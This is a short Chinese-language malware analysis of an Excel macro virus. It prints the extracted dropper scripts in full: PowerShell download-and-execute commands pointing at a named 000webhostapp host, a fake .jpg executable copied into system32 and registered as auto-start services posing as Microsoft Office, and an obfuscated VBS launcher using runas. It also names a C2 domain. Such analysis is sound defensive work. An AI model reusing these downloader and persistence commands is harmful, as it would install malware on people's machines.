样本来源于卡饭,一款excel宏病毒<br>
使用微软offeicescan提取出宏代码。<br>
![](https://github.com/leemz2016/cplusplus/blob/master/%E7%AC%94%E8%AE%B0/img/%E6%8F%90%E5%8F%96.png)<br>
thisworkbook.vbs中创建了3个文件 C:\Users\Public\Af.vbs c:\Users\Public\Af.bat C:\Users\Public\Af2.bat<br>
做了混淆，使用vb调试器下文件写入地方下段可以看到3个文件中的内容，bat脚本中%%中内容为注释可以去掉<br>
![](https://github.com/leemz2016/cplusplus/blob/master/%E7%AC%94%E8%AE%B0/img/%E8%84%9A%E6%9C%AC.png)<br>
<br>
af2.bat:<br>
```powershell
powershell.exe -c (new-object System.Net.WebClient).DownloadFile('https://zeroratchet。000webhostapp.com/vbs.vbs','C:\Users\Public\vbs.vbs');
C:\Users\Public\vbs.vbs
```
af2.bat 从zeroratchet.000webhostapp下载vbs.vbs脚本<br>
vbs.vbs调用powershell修改注册表，与c&c域名microsoft-downloads[.]duckdns[.]org:666/admin/get.php通信，并下载证书安装<br>
<br>
af.bat:<br>
```powershell
powershell.exe -c (new-object System.Net.WebClient).DownloadFile('https://zeroratchet。000webhostapp.com/OfficeUpdate.jpg','C:\Users\Public\OfficeUpdate.exe');
timeout 5
xcopy /b/v/y C:\Users\Public\OfficeUpdate.exe C:\Windows\system32\
SC.exe Create "Microsoft_Officex" binpath= "C:\Windows\system32\OfficeUpdate.exe" type= "interact" type= "own" start= "auto" displayname= "Microsoft_Officex"
SC.exe Create "Microsoft_Office" binpath= "C:\Windows\SysWOW64\OfficeUpdate.exe" type= "interact" type= "own" start= "auto" displayname= "Microsoft_Office"
C:\Users\Public\vbs.vbs
exit
```
af.bat从zeroratchet.000webhostapp下载一个jpg文件，其实是个exe文件。将OfficeUpdate.exe拷贝到system32目录下，然后用sc注册系统服务启动<br>
<br>
af.vbs:<br>
```powershell
Set WshShell = CreateObject("WScript.Shell")
WshShell.Run chr(34) & Chr(67) & ":\Users\Public\Af2.bat" & Chr(34), 0
Set WshShell = Nothing
WScript.Sleep(5000)
Set objShell = CreateObject("Shell.Application")
objShell.ShellExecute Chr(99) & Chr(109) & Chr(100) & Chr(46) & chr(101) & chr(120) & chr(101) & "", "/c C:\Users\Public\Af.bat", "", "runas", 0
Set x = CreateObject("wscript.shell")
```
af.vbs调用cmd执行af.bat<br>
